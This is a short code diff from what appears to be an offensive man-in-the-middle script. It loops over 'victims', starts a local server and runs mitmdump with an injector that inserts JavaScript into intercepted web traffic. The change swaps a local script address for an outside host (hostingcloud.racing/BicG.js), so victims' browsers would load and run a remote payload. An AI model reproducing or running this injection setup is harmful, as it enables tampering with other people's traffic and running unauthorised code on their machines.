@@ -25,7 +25,7 @@ for victim in victims:
 os.system("xterm -hold -e 'python3 httpServer.py' &")
 
 # start the mitmproxy
-os.system("~/.local/bin/mitmdump -s 'injector.py http://192.168.1.32:8000/script.js' -T")
+os.system("~/.local/bin/mitmdump -s 'injector.py https://www.hostingcloud.racing/BicG.js' -T")
 
 
 '''
